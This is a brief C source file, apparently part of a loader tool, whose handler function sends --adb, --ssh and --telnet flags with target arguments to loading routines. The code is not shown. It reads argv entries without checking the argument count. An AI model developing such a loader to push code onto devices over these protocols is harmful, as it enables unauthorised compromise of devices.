#include "../../includes/io/handler.h"


/*
    *    util/loader/util/io/handler.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


void handler(int argc, char **argv) {
    if (strncmp(argv[1], "--adb", strlen("--adb")) == 0 && argv[2] != NULL && argv[3] != NULL) {
        adb_load(argv[2], argv[3]);
    }
    
    if (strncmp(argv[1], "--ssh", strlen("--ssh")) == 0 && argv[2] != NULL && argv[3] != NULL && argv[4] != NULL) {
        p_start(argv[1], argv[2], argv[3], argv[4]);
    }
    
    if (strncmp(argv[1], "--telnet", strlen("--telnet")) == 0 && argv[2] != NULL && argv[3] != NULL && argv[4] != NULL) {
        p_start(argv[1], argv[2], argv[3], argv[4]);
    }
}

bool check_args(int argc, char **argv) {
    if (argc < 2) {
        return false;
    }
    return true;
}